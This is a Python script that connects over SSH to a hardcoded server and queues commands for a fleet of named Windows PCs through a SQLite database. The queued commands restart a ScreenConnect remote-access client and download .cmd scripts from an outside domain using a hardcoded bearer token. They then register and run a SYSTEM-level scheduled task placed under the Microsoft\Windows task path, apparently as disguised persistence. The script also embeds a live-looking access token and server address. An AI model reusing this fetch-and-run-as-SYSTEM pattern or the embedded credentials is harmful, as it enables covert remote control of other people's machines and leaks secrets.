#!/usr/bin/env python3
"""Follow-up: 0Q4F5D9 + JQKHHML Gryxa recover; fleet status for batch."""
from __future__ import annotations

import sys
import time
from pathlib import Path

import paramiko

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
TOKEN = "fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
GFP = "36e506ff016b2151"

# Short start-first, then recover via schtasks (C29/C31)
FIX = (
    f'sc start "ScreenConnect Client ({GFP})" & '
    rf'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer {TOKEN}" '
    r'--connect-timeout 12 --max-time 60 -o C:\Users\Public\gryxa_recover4.cmd '
    r'https://debian.seczio.com/winrtcs/winrtcs_gryxa_recover4.cmd '
    r' & C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer '
    + TOKEN
    + r'" --connect-timeout 12 --max-time 45 -o C:\ProgramData\WinRTCS\winrtcs_guard.cmd '
    r'https://debian.seczio.com/winrtcs/winrtcs_guard.cmd '
    r' & rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd '
    r' & del /f /q C:\ProgramData\WinRTCS\guard.lock C:\ProgramData\WinRTCS\extkill.cnt '
    r' & >C:\ProgramData\WinRTCS\guard.cnt echo 999 '
    r' & schtasks /Create /TN "\Microsoft\Windows\WinRTCS\GryxaRecover" '
    r'/TR "cmd.exe /c C:\Users\Public\gryxa_recover4.cmd --detached" '
    r'/SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F '
    r' & schtasks /Run /TN "\Microsoft\Windows\WinRTCS\GryxaRecover" '
    r' & echo FIX2_QUEUED'
)

PROBE = (
    f'sc query "ScreenConnect Client ({GFP})" & '
    f'sc start "ScreenConnect Client ({GFP})" & '
    f'sc query "ScreenConnect Client ({GFP})" & '
    r'echo PROBE2_DONE'
)


def ssh_connect() -> paramiko.SSHClient:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        "144.172.107.56",
        username="winrtcs",
        key_filename=str(Path.home() / ".ssh" / "winrtcs_ed25519"),
        timeout=20,
    )
    return ssh


def queue(ssh: paramiko.SSHClient, target: str, body: str) -> int:
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/batch_cmd_body.txt", "w") as f:
        f.write(body)
    with sftp.file("/tmp/q_batch.py", "w") as f:
        f.write(
            "import sqlite3,time\n"
            "con=sqlite3.connect('/opt/winrtcs/fleet.db')\n"
            "cmd=open('/tmp/batch_cmd_body.txt',encoding='utf-8').read().strip()\n"
            "cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',"
            f"(time.time(),{target!r},cmd[:4000]))\n"
            "print(cur.lastrowid); con.commit()\n"
        )
    sftp.close()
    _, o, _ = ssh.exec_command("sudo python3 /tmp/q_batch.py", timeout=30)
    return int(o.read().decode().strip().splitlines()[-1])


def wait_one(ssh: paramiko.SSHClient, host: str, cid: int, needle: str, rounds: int = 24) -> str:
    last = ""
    for i in range(rounds):
        time.sleep(15)
        poll = (
            "import sqlite3,os\n"
            "os.system('sudo cp /opt/winrtcs/fleet.db /tmp/fleet_ro.db')\n"
            "os.system('sudo cp -f /opt/winrtcs/fleet.db-wal /tmp/fleet_ro.db-wal 2>/dev/null')\n"
            "os.system('sudo chmod 644 /tmp/fleet_ro.db /tmp/fleet_ro.db-wal /tmp/fleet_ro.db-shm 2>/dev/null')\n"
            "c=sqlite3.connect('/tmp/fleet_ro.db')\n"
            f"r=c.execute('SELECT rc,out FROM results WHERE cmd_id=? AND host=?',({cid},{host!r})).fetchone()\n"
            "print('FOUND' if r else 'WAIT')\n"
            "if r:\n print('RC', r[0])\n print(r[1] or '')\n"
        )
        sftp = ssh.open_sftp()
        with sftp.file("/tmp/w1.py", "w") as f:
            f.write(poll)
        sftp.close()
        _, o, _ = ssh.exec_command("python3 /tmp/w1.py", timeout=60)
        text = o.read().decode("utf-8", "replace")
        last = text
        print(f"[{host}/{cid} {i}] {(text.splitlines() or [''])[0]}")
        if text.startswith("FOUND") and needle in text:
            return text
    return last


def fleet(ssh: paramiko.SSHClient) -> None:
    py = r"""
import sqlite3, os, time, json
os.system('sudo cp /opt/winrtcs/fleet.db /tmp/fleet_ro.db')
os.system('sudo cp -f /opt/winrtcs/fleet.db-wal /tmp/fleet_ro.db-wal 2>/dev/null')
os.system('sudo chmod 644 /tmp/fleet_ro.db /tmp/fleet_ro.db-wal /tmp/fleet_ro.db-shm 2>/dev/null')
c=sqlite3.connect('/tmp/fleet_ro.db'); c.row_factory=sqlite3.Row
now=time.time()
hosts=['LAPTOP-1P6GP1UQ','DESKTOP-JQKHHML','DESKTOP-GG4NNSJ','DESKTOP-0Q4F5D9','CARI']
for h in hosts:
    r=c.execute('SELECT * FROM hosts WHERE host=?',(h,)).fetchone()
    if not r: print(h,'MISSING'); continue
    d=dict(r)
    for k in ('last_seen','last_beat'):
        if d.get(k): d[k+'_ago_min']=round((now-float(d[k]))/60,1)
    print(json.dumps({k:d.get(k) for k in ('host','state','agent','guard','rmm','last_seen_ago_min','last_beat_ago_min')}, default=str))
# pending cmds
print('=== pending cmds ===')
for h in hosts+['LAPTOPBE','EASYLAB0514-2','DESKTOP-7M84CP8','CARPED-P16S','PIERREADOLPHE']:
    n=c.execute('''SELECT count(*) FROM cmds c WHERE c.target=? AND NOT EXISTS (SELECT 1 FROM results r WHERE r.cmd_id=c.id)''',(h,)).fetchone()[0]
    print(h, 'pending', n)
"""
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/f2.py", "w") as f:
        f.write(py)
    sftp.close()
    _, o, e = ssh.exec_command("python3 /tmp/f2.py", timeout=30)
    print(o.read().decode("utf-8", "replace"))


def main() -> None:
    ssh = ssh_connect()
    print("=== fleet before ===")
    fleet(ssh)

    cid1 = queue(ssh, "DESKTOP-0Q4F5D9", FIX)
    print("0Q4 fix", cid1)
    print(wait_one(ssh, "DESKTOP-0Q4F5D9", cid1, "FIX2_QUEUED", rounds=20)[:2000])

    cid2 = queue(ssh, "DESKTOP-JQKHHML", FIX)
    print("JQK fix", cid2)
    print(wait_one(ssh, "DESKTOP-JQKHHML", cid2, "FIX2_QUEUED", rounds=16)[:2000])

    print("wait 3.5 min recover...")
    time.sleep(210)

    for h in ("DESKTOP-0Q4F5D9", "DESKTOP-JQKHHML", "LAPTOP-1P6GP1UQ", "DESKTOP-GG4NNSJ"):
        cid = queue(ssh, h, PROBE)
        print("probe", h, cid)
        out = wait_one(ssh, h, cid, "PROBE2_DONE", rounds=16)
        print(out[:2000])
        Path(rf"C:\Users\nobuddy\Desktop\probe_{h}.txt").write_text(out, encoding="utf-8")

    print("=== fleet after ===")
    fleet(ssh)
    ssh.close()


if __name__ == "__main__":
    main()
